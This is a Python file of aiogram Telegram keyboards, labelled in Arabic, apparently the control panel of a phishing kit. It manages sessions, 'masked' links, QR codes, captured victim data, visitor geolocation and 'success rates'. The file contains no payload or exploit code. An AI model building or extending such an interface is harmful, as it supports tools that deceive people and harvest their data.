"""
📱 لوحة مفاتيح إدارة الجلسات المتقدمة
تحتوي على جميع وظائف إدارة ومراقبة الجلسات
"""

from typing import List, Dict, Any, Optional
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

class SessionManagementKeyboard:
    """مولد لوحات مفاتيح إدارة الجلسات"""
    
    @staticmethod
    def get_session_details(session_id: str, session_data: Dict[str, Any]) -> InlineKeyboardMarkup:
        """عرض تفاصيل الجلسة مع أزرار الإدارة"""
        
        status = session_data.get('status', 'unknown')
        
        buttons = []
        
        # معلومات الجلسة
        if status == "active":
            buttons.append([
                InlineKeyboardButton(
                    text="📊 الإحصائيات المباشرة",
                    callback_data=f"session_live_stats_{session_id}"
                ),
                InlineKeyboardButton(
                    text="🎯 البيانات المُلتقطة",
                    callback_data=f"session_captured_{session_id}"
                )
            ])
            
            buttons.append([
                InlineKeyboardButton(
                    text="🔗 إدارة الروابط",
                    callback_data=f"session_links_{session_id}"
                ),
                InlineKeyboardButton(
                    text="📱 QR Code",
                    callback_data=f"session_qr_{session_id}"
                )
            ])
            
            buttons.append([
                InlineKeyboardButton(
                    text="⚙️ إعدادات الجلسة",
                    callback_data=f"session_config_{session_id}"
                ),
                InlineKeyboardButton(
                    text="📈 تحليل متقدم",
                    callback_data=f"session_analytics_{session_id}"
                )
            ])
            
            buttons.append([
                InlineKeyboardButton(
                    text="⏸️ إيقاف مؤقت",
                    callback_data=f"session_pause_{session_id}"
                ),
                InlineKeyboardButton(
                    text="🛑 إيقاف نهائي",
                    callback_data=f"session_stop_{session_id}"
                )
            ])
            
        elif status in ["stopped", "error"]:
            buttons.append([
                InlineKeyboardButton(
                    text="📊 عرض التقرير النهائي",
                    callback_data=f"session_final_report_{session_id}"
                ),
                InlineKeyboardButton(
                    text="💾 تصدير البيانات",
                    callback_data=f"session_export_{session_id}"
                )
            ])
            
            buttons.append([
                InlineKeyboardButton(
                    text="🔄 إعادة التشغيل",
                    callback_data=f"session_restart_{session_id}"
                ),
                InlineKeyboardButton(
                    text="📋 نسخ الإعدادات",
                    callback_data=f"session_clone_{session_id}"
                )
            ])
            
            buttons.append([
                InlineKeyboardButton(
                    text="🗑️ حذف الجلسة",
                    callback_data=f"session_delete_{session_id}"
                )
            ])
        
        # أزرار التنقل
        buttons.append([
            InlineKeyboardButton(
                text="🔄 تحديث",
                callback_data=f"session_refresh_{session_id}"
            ),
            InlineKeyboardButton(
                text="◀️ جلساتي",
                callback_data="my_sessions"
            )
        ])
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_session_links_menu(session_id: str, links: Dict[str, str]) -> InlineKeyboardMarkup:
        """قائمة روابط الجلسة"""
        
        buttons = []
        
        # روابط الجلسة
        if links.get('local_url'):
            buttons.append([
                InlineKeyboardButton(
                    text="🏠 نسخ الرابط المحلي",
                    callback_data=f"copy_local_{session_id}"
                )
            ])
        
        if links.get('public_url'):
            buttons.append([
                InlineKeyboardButton(
                    text="🌐 نسخ الرابط العام",
                    callback_data=f"copy_public_{session_id}"
                )
            ])
        
        if links.get('short_url'):
            buttons.append([
                InlineKeyboardButton(
                    text="🔗 نسخ الرابط المختصر",
                    callback_data=f"copy_short_{session_id}"
                )
            ])
        
        if links.get('masked_url'):
            buttons.append([
                InlineKeyboardButton(
                    text="🎭 نسخ الرابط المقنع",
                    callback_data=f"copy_masked_{session_id}"
                )
            ])
        
        # أدوات إضافية
        buttons.append([
            InlineKeyboardButton(
                text="📱 إنشاء QR Code",
                callback_data=f"generate_qr_{session_id}"
            ),
            InlineKeyboardButton(
                text="🔗 اختصار مخصص",
                callback_data=f"custom_short_{session_id}"
            )
        ])
        
        buttons.append([
            InlineKeyboardButton(
                text="📋 نسخ جميع الروابط",
                callback_data=f"copy_all_links_{session_id}"
            )
        ])
        
        buttons.append([
            InlineKeyboardButton(
                text="◀️ رجوع للجلسة",
                callback_data=f"session_details_{session_id}"
            )
        ])
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_session_analytics(session_id: str) -> InlineKeyboardMarkup:
        """قائمة تحليل الجلسة"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="🌍 التوزيع الجغرافي",
                    callback_data=f"analytics_geo_{session_id}"
                ),
                InlineKeyboardButton(
                    text="📱 تحليل الأجهزة",
                    callback_data=f"analytics_devices_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🌐 المتصفحات",
                    callback_data=f"analytics_browsers_{session_id}"
                ),
                InlineKeyboardButton(
                    text="🕐 التوزيع الزمني",
                    callback_data=f"analytics_time_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🎯 معدل النجاح",
                    callback_data=f"analytics_success_{session_id}"
                ),
                InlineKeyboardButton(
                    text="👥 سلوك الزوار",
                    callback_data=f"analytics_behavior_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="📊 تقرير شامل",
                    callback_data=f"analytics_full_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للجلسة",
                    callback_data=f"session_details_{session_id}"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_export_options(session_id: str) -> InlineKeyboardMarkup:
        """خيارات تصدير البيانات"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="📊 Excel (XLSX)",
                    callback_data=f"export_excel_{session_id}"
                ),
                InlineKeyboardButton(
                    text="📋 CSV",
                    callback_data=f"export_csv_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="📄 JSON",
                    callback_data=f"export_json_{session_id}"
                ),
                InlineKeyboardButton(
                    text="📑 PDF",
                    callback_data=f"export_pdf_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="📱 TXT",
                    callback_data=f"export_txt_{session_id}"
                ),
                InlineKeyboardButton(
                    text="🗂️ ZIP (جميع الصيغ)",
                    callback_data=f"export_all_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="⚙️ خيارات متقدمة",
                    callback_data=f"export_advanced_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للجلسة",
                    callback_data=f"session_details_{session_id}"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_session_config(session_id: str) -> InlineKeyboardMarkup:
        """إعدادات الجلسة"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="🔔 إدارة الإشعارات",
                    callback_data=f"config_notifications_{session_id}"
                ),
                InlineKeyboardButton(
                    text="⏰ الإيقاف التلقائي",
                    callback_data=f"config_auto_stop_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🎭 تغيير القناع",
                    callback_data=f"config_mask_{session_id}"
                ),
                InlineKeyboardButton(
                    text="🔗 إعداد الروابط",
                    callback_data=f"config_urls_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🛡️ إعدادات الأمان",
                    callback_data=f"config_security_{session_id}"
                ),
                InlineKeyboardButton(
                    text="📊 إعدادات التتبع",
                    callback_data=f"config_tracking_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="💾 حفظ كقالب",
                    callback_data=f"config_save_template_{session_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للجلسة",
                    callback_data=f"session_details_{session_id}"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_session_confirmation(action: str, session_id: str) -> InlineKeyboardMarkup:
        """تأكيد إجراء على الجلسة"""
        
        action_texts = {
            'stop': ('🛑 تأكيد الإيقاف', '❌ إلغاء'),
            'delete': ('🗑️ تأكيد الحذف', '❌ إلغاء'),
            'restart': ('🔄 تأكيد إعادة التشغيل', '❌ إلغاء'),
            'pause': ('⏸️ تأكيد الإيقاف المؤقت', '❌ إلغاء')
        }
        
        confirm_text, cancel_text = action_texts.get(action, ('✅ تأكيد', '❌ إلغاء'))
        
        buttons = [
            [
                InlineKeyboardButton(
                    text=confirm_text,
                    callback_data=f"confirm_{action}_{session_id}"
                ),
                InlineKeyboardButton(
                    text=cancel_text,
                    callback_data=f"session_details_{session_id}"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)

class CapturedDataKeyboard:
    """لوحة مفاتيح البيانات المُلتقطة"""
    
    @staticmethod
    def get_data_list(page: int = 1, session_id: Optional[str] = None) -> InlineKeyboardMarkup:
        """قائمة البيانات المُلتقطة مع ترقيم الصفحات"""
        
        buttons = []
        
        # خيارات العرض والفلترة
        buttons.append([
            InlineKeyboardButton(
                text="🔍 بحث",
                callback_data="captured_search"
            ),
            InlineKeyboardButton(
                text="🗂️ فلترة",
                callback_data="captured_filter"
            )
        ])
        
        buttons.append([
            InlineKeyboardButton(
                text="📊 إحصائيات",
                callback_data="captured_stats"
            ),
            InlineKeyboardButton(
                text="💾 تصدير الكل",
                callback_data="captured_export_all"
            )
        ])
        
        # أزرار التنقل (ستُملأ ديناميكياً حسب البيانات)
        nav_buttons = []
        if page > 1:
            nav_buttons.append(InlineKeyboardButton(
                text="◀️ السابق",
                callback_data=f"captured_page_{page-1}"
            ))
        
        nav_buttons.append(InlineKeyboardButton(
            text=f"📄 {page}",
            callback_data="current_page"
        ))
        
        # سيتم إضافة زر التالي ديناميكياً
        
        if nav_buttons:
            buttons.append(nav_buttons)
        
        # زر الرجوع
        if session_id:
            buttons.append([
                InlineKeyboardButton(
                    text="◀️ رجوع للجلسة",
                    callback_data=f"session_details_{session_id}"
                )
            ])
        else:
            buttons.append([
                InlineKeyboardButton(
                    text="◀️ القائمة الرئيسية",
                    callback_data="main_menu"
                )
            ])
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_data_details(data_id: str) -> InlineKeyboardMarkup:
        """تفاصيل بيانات مُلتقطة محددة"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="👁️ عرض البيانات",
                    callback_data=f"data_view_{data_id}"
                ),
                InlineKeyboardButton(
                    text="📋 نسخ البيانات",
                    callback_data=f"data_copy_{data_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🌍 معلومات جغرافية",
                    callback_data=f"data_geo_{data_id}"
                ),
                InlineKeyboardButton(
                    text="📱 معلومات الجهاز",
                    callback_data=f"data_device_{data_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="✅ وضع علامة صحيح",
                    callback_data=f"data_verify_{data_id}"
                ),
                InlineKeyboardButton(
                    text="❌ وضع علامة خطأ",
                    callback_data=f"data_invalid_{data_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🏷️ إضافة علامة",
                    callback_data=f"data_tag_{data_id}"
                ),
                InlineKeyboardButton(
                    text="📝 إضافة ملاحظة",
                    callback_data=f"data_note_{data_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="💾 تصدير",
                    callback_data=f"data_export_{data_id}"
                ),
                InlineKeyboardButton(
                    text="🗑️ حذف",
                    callback_data=f"data_delete_{data_id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للقائمة",
                    callback_data="captured_data"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_filter_options() -> InlineKeyboardMarkup:
        """خيارات فلترة البيانات"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="🌍 حسب البلد",
                    callback_data="filter_country"
                ),
                InlineKeyboardButton(
                    text="📱 حسب الجهاز",
                    callback_data="filter_device"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🌐 حسب المتصفح",
                    callback_data="filter_browser"
                ),
                InlineKeyboardButton(
                    text="📅 حسب التاريخ",
                    callback_data="filter_date"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🎯 حسب الجلسة",
                    callback_data="filter_session"
                ),
                InlineKeyboardButton(
                    text="✅ البيانات الصحيحة فقط",
                    callback_data="filter_verified"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔄 إزالة جميع الفلاتر",
                    callback_data="filter_clear"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع",
                    callback_data="captured_data"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)